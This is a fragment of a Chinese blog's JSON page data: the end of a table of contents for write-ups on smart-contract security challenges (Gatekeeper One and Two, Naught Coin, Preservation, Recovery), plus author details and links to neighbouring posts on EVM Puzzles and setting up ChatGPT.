href=\"#%E7%8A%B6%E6%80%81%E5%8F%98%E9%87%8F%E5%9C%A8%E5%AD%98%E5%82%A8%E4%B8%AD%E7%9A%84%E5%B8%83%E5%B1%80\"><span class=\"toc-text\">状态变量在存储中的布局</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%EF%BC%88https-learnblockchain-cn-docs-solidity-internals-layout-in-storage-html%EF%BC%89\"><span class=\"toc-text\">（https:&#x2F;&#x2F;learnblockchain.cn&#x2F;docs&#x2F;solidity&#x2F;internals&#x2F;layout_in_storage.html）</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#14-Gatekeeper-One\"><span class=\"toc-text\">14.Gatekeeper One</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">基本类型之间的转换</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%9A%90%E5%BC%8F%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">隐式转换</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%98%BE%E7%A4%BA%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">显示转换</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%8D%E6%8E%A9%E7%A0%81\"><span class=\"toc-text\">位掩码</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#15-Gatekeeper-Two\"><span class=\"toc-text\">15.Gatekeeper Two</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Assembly\"><span class=\"toc-text\">Assembly</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XOR%EF%BC%88%E6%8C%89%E4%BD%8D%E5%BC%82%E6%88%96%EF%BC%89\"><span class=\"toc-text\">XOR（按位异或）</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#16-Naught-Coin\"><span class=\"toc-text\">16.Naught Coin</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ERC20\"><span class=\"toc-text\">ERC20</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%9A%8F%E6%9C%BA%E6%95%B0\"><span class=\"toc-text\">随机数</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#17-Preservation\"><span class=\"toc-text\">17.Preservation</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#18-Recovery\"><span class=\"toc-text\">18.Recovery</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#create%E5%92%8Ccreate2%EF%BC%88%E5%9C%A8%E4%B9%8B%E5%89%8D%E5%86%99%E7%9A%84solidity%E8%BF%9B%E9%98%B6%E9%87%8C%E9%9D%A2%E6%9C%89%EF%BC%89\"><span class=\"toc-text\">create和create2（在之前写的solidity进阶里面有）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%90%88%E7%BA%A6%E7%9A%84%E5%9C%B0%E5%9D%80%E8%AE%A1%E7%AE%97%EF%BC%88https-ethereum-stackexchange-com-questions-760-how-is-the-address-of-an-ethereum-contract-computed-761-761%EF%BC%89\"><span class=\"toc-text\">以太坊合约的地址计算（https:&#x2F;&#x2F;ethereum.stackexchange.com&#x2F;questions&#x2F;760&#x2F;how-is-the-address-of-an-ethereum-contract-computed&#x2F;761#761）</span></a></li></ol></li></ol></li></ol>","author":{"name":"cocoZ","slug":"cocoz","avatar":"https://s2.loli.net/2022/12/17/7LdKkiUEVc9wQ1x.jpg","link":"/","description":"想越来越优秀！！！<br/>要变得越来越听话！！！ <br/> @ <b·>QQ:1601760796<b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"EVM Puzzles题解","uid":"22c49c6ffbea3c60b8a9bf177b3b8838","slug":"EVM Puzzles题解","date":"2023-03-24T15:32:03.000Z","updated":"2023-03-24T15:34:31.088Z","comments":true,"path":"api/articles/EVM Puzzles题解.json","keywords":null,"cover":"https://s2.loli.net/2022/12/17/eOYWR2zZ9rqSchP.jpg","text":"配置环境git clone https://github.com/fvictorio/evm-puzzles.git cd evm-puzzles npm install npx hardhat play 输入这两行代码开始做题 cd evm-puzzles npx hardha...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[],"tags":[{"name":"EVM","slug":"EVM","count":1,"path":"api/tags/EVM.json"}],"author":{"name":"cocoZ","slug":"cocoz","avatar":"https://s2.loli.net/2022/12/17/7LdKkiUEVc9wQ1x.jpg","link":"/","description":"想越来越优秀！！！<br/>要变得越来越听话！！！ <br/> @ <b·>QQ:1601760796<b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"ChatGPT的搭建","uid":"462812fbbc64f9c8b5d4c209bcb7fd5a","slug":"ChatGPT","date":"2023-03-20T04:15:54.000Z","updated":"2023-03-20T04:19:47.035Z","comments":true,"path":"api/articles/ChatGPT.json","keywords":null,"cover":"https://s2.loli.net/2022/12/17/6h9QCTbrRjUsx1c.jpg","text":"什么是ChatGPT 我是 Assistant，一个由 OpenAI 训练的大型语言模型。我可以回答您的问题，并帮助您了解更多关于特定主题的信息。我并不具备自己的意识，只能通过我所学到的知识来回答问题。如果您有任何其他问题，请随时问我。我很乐意帮助您。 —ChatGPT 什么是O...","link":"","photos":[],"count_time":{"symbolsCount":795,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"ChatGPT","slug":"ChatGPT","count":1,"path":"api/tags/ChatGPT.json"}],"author":{"name":"cocoZ","slug":"cocoz","avatar":"https://s2.loli.net/2022/12/17/7LdKkiUEVc9wQ1x.jpg","link":"/","description":"想越来越优秀！！！<br/>要变得越来越听话！！！ <br/> @ <b·>QQ:1601760796<b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}